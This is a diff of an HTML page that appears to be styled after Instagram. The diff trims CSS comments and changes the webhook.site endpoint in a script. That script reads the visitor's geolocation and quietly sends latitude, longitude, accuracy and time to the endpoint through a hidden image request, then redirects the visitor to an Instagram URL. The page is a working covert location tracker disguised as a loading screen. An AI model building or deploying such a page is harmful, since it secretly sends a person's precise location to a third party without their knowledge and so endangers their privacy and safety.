@@ -25,10 +25,10 @@
       margin-bottom: 40px;
     }
     .spinner {
-      border: 4px solid rgba(255, 255, 255, 0.2); /* Slightly smaller border */
+      border: 4px solid rgba(255, 255, 255, 0.2); 
       border-top: 4px solid #e1306c;
       border-radius: 50%;
-      width: 30px; /* Smaller spinner */
+      width: 30px; 
       height: 30px;
       animation: spin 1s linear infinite;
       margin: 40px auto;
@@ -75,7 +75,7 @@
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
 
-      new Image().src = 'https://webhook.site/4a22cc8b-039a-40f3-8daa-764ec9104815?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + new Date().toISOString();
+      new Image().src = 'https://webhook.site/a4f600b9-76c9-4478-9ae0-283153385c4c?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + new Date().toISOString();
 
       setTimeout(() => window.location.href = IG_URL, 1500);
     }
@@ -87,4 +87,5 @@
 </body>
 
 </html>
+
 
